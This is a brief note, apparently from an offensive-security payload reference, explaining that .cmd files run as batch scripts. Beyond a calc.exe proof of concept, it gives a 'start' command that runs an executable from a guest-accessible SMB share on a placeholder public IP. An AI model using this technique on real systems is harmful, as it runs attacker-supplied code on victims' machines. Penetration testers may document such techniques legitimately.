# cmd

This file extension is equivalent to .bat files ! 
So you can use it to write a batch script
The suggested script will just run the calc.exe
However you can setup an SMB server, Then allow guest users, and then write the following code

start \\PUBLIC_IP\\$SHARE\c.exe

